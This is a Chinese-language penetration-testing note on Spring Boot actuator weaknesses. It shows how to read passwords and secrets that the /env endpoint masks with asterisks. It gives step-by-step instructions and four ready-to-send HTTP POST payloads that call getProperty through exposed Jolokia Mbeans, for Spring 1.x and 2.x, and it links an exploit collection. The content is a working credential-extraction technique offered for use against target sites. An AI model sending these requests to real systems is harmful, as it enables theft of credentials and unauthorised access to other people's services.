Java SpringBoot 安全
<a name="dFI98"></a>
## 获取被星号(*) 脱敏的密码明文
访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果
<a name="MSojs"></a>
### 利用条件：

- 目标网站存在 /jolokia 或 /actuator/jolokia 接口
- 目标使用了 jolokia-core 依赖（版本要求暂未知）
<a name="WO2Yx"></a>
### 利用方法：
<a name="QmuiO"></a>
#### 步骤一：找到想要获取的属性名
GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。
<a name="VqGRf"></a>
#### 步骤二：jolokia 调用相关 Mbean 获取明文
将下面示例中的 security.user.password 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 value 键中。

- 调用 org.springframework.boot Mbean

实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法<br />spring 1.x
```http
POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```
spring 2.x
```http
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

- 调用 org.springframework.cloud.context.environment Mbean

实际上是调用 `org.springframework.cloud.context.environment.EnvironmentManager` 类实例的 `getProperty` 方法<br />spring 1.x
```http
POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```
spring 2.x
```http
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

- 调用其他 Mbean

目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。
<a name="xlToW"></a>
## 更多漏洞
Github地址：[https://github.com/LandGrey/SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit)<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1624155335923-7bd88dc1-50c5-4225-8f97-9135ffd473be.webp#clientId=u91ab141a-268e-4&from=paste&id=u302e2b24&originHeight=2174&originWidth=1080&originalType=url&ratio=3&rotation=0&showTitle=false&status=done&style=shadow&taskId=uff8b1a02-1479-422e-a120-324a3b918f4&title=)<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1624155337172-23670ddc-0f9e-4297-b991-0d9f4c002e29.webp#clientId=u91ab141a-268e-4&from=paste&id=u4fa31373&originHeight=2174&originWidth=1080&originalType=url&ratio=3&rotation=0&showTitle=false&status=done&style=shadow&taskId=u56181766-178c-4066-80a7-e56b84df271&title=)<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1624155336045-a03834dc-b73f-44d7-a7a4-641622b17681.webp#clientId=u91ab141a-268e-4&from=paste&id=ub51beb6f&originHeight=2174&originWidth=1080&originalType=url&ratio=3&rotation=0&showTitle=false&status=done&style=shadow&taskId=u49d1bb77-e21f-4ae0-921a-4faf3bac129&title=)
